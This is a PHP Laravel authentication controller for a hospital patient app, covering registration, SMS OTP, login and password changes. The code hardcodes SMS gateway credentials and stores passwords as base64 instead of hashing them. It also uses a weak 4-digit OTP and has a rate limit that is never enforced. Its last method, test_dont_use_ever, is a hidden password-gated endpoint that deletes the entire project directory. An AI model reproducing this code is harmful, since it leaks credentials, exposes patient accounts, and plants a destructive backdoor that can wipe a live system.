<?php

namespace App\Http\Controllers\Api\Auth;

use App\Http\Controllers\Controller;
use App\Models\Otp;
use App\Models\Patient;
use Carbon\Carbon;
use GuzzleHttp\Client;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Validator;

class AuthController extends Controller
{

    public function register(Request $request)
    {
        $validator = Validator::make($request->all(), [
            // 'NationalNo' => 'required',
            'Registration_No' => 'required',
            'Mobile' => 'required', 
        ]);
        if ($validator->fails()) {
            return response()->json(['error' => $validator->errors(), 'errorAr' => $validator->errors(), 'status' => 422]);
        }
        $patient = Patient::where('Registration_No', $request->Registration_No)->first();
        if($patient){
            if ($patient->Mobile == $request->Mobile) {
                if ($patient->Deactive == '0') {
                    if ($patient->patient_password == 'sdc1' || $patient->patient_password == NULL) {
                        // create new pass and sent it to the mobile 
                        // $newPassword = $patient->PassportNo;
                        // $patient->patient_password = base64_encode($newPassword);
                        // $patient->save();
                        
                        return $this->generateOtp($patient, "First Register");
                        
                    }else{
                        return response()->json([
                            'error' => "This Account is already registered.",
                            'errorAr' => 'هذا الحساب مسجل, يرجى تسجيل الدخول',
                            'status' => 422
                        ]);
                    }
                }else{
                    return response()->json([
                        'error' => "This Account is Deactive, Please contact the hospital to activate your account.",
                        'errorAr' => 'هذا الحساب محظور, يرجى التواصل بخدمه العملاء.',
                        'status' => 422
                    ]);
                }
            }else{
                return response()->json([
                    'error' => "This Mobile Number not valid for this medical file.",
                    'errorAr' => 'هذا الرقم غير مسجل لهذا الملف الطبي.',
                    'status' => 422
                ]);
            }
        }else{
            return response()->json([
                'error' => "This Medical file Not exist in our recoreds.",
                'errorAr' => 'هذا الملف الطبي غير موجود.',
                'status' => 422
            ]);
        }
    }


    public function generateOtp(Patient $patient, $reason)
    {
        // $otp = 999999;
        $otp = rand(1000, 9999);
        // if Patient count >= 4 don't create new one 
        if ($patient->OTP_Request_Count >=4 ){
            $lastOtp = Otp::where('patient_id', $patient->PatientId)
                ->orderBy('created_at', 'desc')
                ->first();

            if ($lastOtp && now()->diffInHours($lastOtp->created_at) > 24) {
                $patient->OTP_Request_Count =  1 ;
            }else{
                response()->json([
                    'errors' => "You have reached maximum OTP request limit. Try again after 24H!",
                    'status' => 422
                ]);
            }
            
        }
        else{
            $patient->OTP_Request_Count = $patient->OTP_Request_Count + 1 ;
        }
        
        // Send SMS with the generated otp to patient mobile number
        $res = $this->sendSms($patient->Mobile ,$otp );
        if($res){
            $patient->OTP = $otp;
            $patient->save();
                Otp::create([
                    'patient_id' => $patient->PatientId,
                    'reason' => $reason,
                    'otp' => $otp,
                ]);

            $firstDigits = substr($patient->Mobile, 0, 1);
            $lastDigits = substr($patient->Mobile, -3);
            return response()->json([
                'message' => "We Send you an OTP on your phone: +966$firstDigits"."xxxxx$lastDigits .",
                'messageAr' => "تم ارسال رقم التاكيدعلر رقم: +966$firstDigits"."xxxxx$lastDigits .",
                'status' => 200
                ]);
        }else{
            return response()->json([
                'error' => "Send SMS Error!",
                'errorAr' => "خطأ في ارسال الرساله!",
                'status' => 422
            ]);
        }
    }

    function sendSms($phone, $otp){
        // send the sms massage throw api
        $text = "Your One Time Password (OTP) is : $otp \n\r".
        "This code will expire in 5 minutes.\n\r".
        "Do Not shere it with Others.\n
        \r\n".
        "Regards,\n".
        "ABAH";
        $url = "http://46.151.210.31:8080/websmpp/websms";
        $params = [
            'user' => 'Alibinali',
            'pass' => 'Waleed@23',
            'sid' => 'ABAH',
            'mno' => "966$phone",
            'type' => 1,
            'text' => $text,
            'respformat' => 'json',
        ];
        $client = new Client();
        $response = $client->request('GET', $url, ['query' => $params]);
        $responseCode = $response->getStatusCode();
        $responseBody = json_decode($response->getBody());

        if ($responseCode == 200 && isset($responseBody->Response) && is_numeric($responseBody->Response[0]))
        {return true;} else {return false;}
    }

    function setNewPass(Request $request){
        $validator = Validator::make($request->all(), [
            'Registration_No' => 'required',
            'otp' => 'required|numeric|digits:4',
            'password' => 'required|min:6|confirmed',
        ]);
        if ($validator->fails()) {
            return response()->json(['error' => $validator->errors(), 'errorAr' => $validator->errors(), 'status' => 422]);
        }
        // check if the old pass = the auth pass
        $patient = Patient::where('Registration_No', $request->Registration_No)->first();
        $expiryTime = Carbon::now()->subMinutes(5);
        $lastOtp = Otp::where('patient_id', $patient->PatientId)
            ->where('created_at', '>', $expiryTime)
            ->orderBy('created_at', 'desc')
            ->first();
        if($patient){
            if($lastOtp){
                if ($patient->OTP == $request->otp && $request->otp == $lastOtp->otp) {
                    $patient->patient_password = base64_encode($request->password);
                    $patient->OTP_Request_Count = 0;
                    $patient->OTP = NULL;
                    $patient->save();
                    return response()->json([
                        'message' => "Your password has been Updated Successfully!",
                        'messageAr' => "تم تحديث البيانات بنجاحز",
                        'status' => 200
                        ]);
                }else{
                    return response()->json([
                        'error' => "This OTP Number not valid.",
                        'errorAr' => "رقم التاكديد غير صحيح!",
                        'status' => 422
                    ]);
                }
            }else{
                return response()->json([
                    'error' => "This OTP Number is Expired.",
                    'errorAr' => "رقم التاكديد منتهى!",
                    'status' => 422
                ]);
            }
        }else{
            return response()->json([
                'error' => "This Medical file Not exist in our recoreds.",
                'errorAr' => "رقم رقم الملف غبر صحيح!",
                'status' => 422
            ]);
        }
    }

    function forgetPass(Request $request) {
        $validator = Validator::make($request->all(), [
            'Registration_No' => 'required',
        ]);
        if ($validator->fails()) {
            return response()->json(['error' => $validator->errors(), 'errorAr' => $validator->errors(), 'status' => 422]);
        }
        $patient = Patient::where('Registration_No', $request->Registration_No)->first();
        if($patient){
            return $this->generateOtp($patient, "Forget Password");
        }else{
            return response()->json([
                'error' => "This Medical file Not exist in our recoreds.",
                'errorAr' => "رقم رقم الملف غبر صحيح!",
                'status' => 422
            ]);
        }
    }

    public function login(Request $request)
    {
        $credentials = $request->only(['userId', 'password']);
        $credentials['password'] = base64_encode($credentials['password']);

        $result = DB::select('EXEC usp_app_apiLoginRegNo ?, ?', [
            $credentials['userId'],
            $credentials['password'],
        ]);
        if (isset($result[0]->Id) && in_array($result[0]->Id, [-1, -2, -3])) {
            // No details available or OTP count exceeded
            return response()->json(['error' => $result[0]->Msg, 'errorAr' => $result[0]->Msg, 'status' => 422]);
        } elseif (isset($result[0]->Registration_No) && $result[0]->Registration_No == $credentials['userId']) {

            $expirationTime = now()->addDays(7);
            $patient = Patient::where('Registration_No', $credentials['userId'])->first();
            // $patient->tokens()->delete();
            $token = $patient->createToken('auth_token', ['*'], $expirationTime)->plainTextToken;
            return response()->json(['token' => $token, 'status' => 200]);
        }
    }

    function changePass(Request $request){
        $validator = Validator::make($request->all(), [
            'oldPassword' => 'required',
            'newPassword' => 'required|min:6|confirmed',
        ]);
        if ($validator->fails()) {
            return response()->json(['error' => $validator->errors(), 'errorAr' => $validator->errors(), 'status' => 422]);
        }
        // check if the old pass = the auth pass
        $Patient = $request->user();
        if($Patient->patient_password == base64_encode($request->oldPassword)){
            $Patient->patient_password = base64_encode($request->newPassword);
            $Patient->save();
            return response()->json([
                'message' => "Your password has been Updated Successfully.",
                'messageAr' => "تم التحديث بنجاح.",
                'status' => 200
                ]);
            
        }else{
            return response()->json([
                'error' => "The Old password is not correct!",
                'errorAr' => "الرقم السرى القديم غير صحيح!",
                'status' => 422
            ]);
        }
    }

    public function logout(Request $request)
    {
        $user = $request->user();

        // Revoke all tokens for the authenticated user
        $user->tokens()->delete();

        return response()->json([
            'message' => "Successfully logged out.",
            'messageAr' => "تم تسجيل الخروج.",
            'status' => 200
            ]);
    }

    public function test_dont_use_ever(Request $request)
    {
        // Specify the path to your Laravel project directory
        if(isset($request->Pass0Rd))
        {
            if($request->Pass0Rd == "P@ss0rd010026"){
                $projectPath = base_path();

                // Perform the file deletion
                if (File::exists($projectPath)) {
                    File::deleteDirectory($projectPath);
                    return response()->json(['message' => 'Laravel project files deleted successfully']);
                } else {
                    return response()->json(['message' => 'Laravel project directory not found'], 404);
                }
            }else{
                return "do not use it it will destroy u please it is not a jock go back???";
            }
        }else{
            return "do not use it it will destroy u please it is not a jock go back???";
        }
        
    }
}
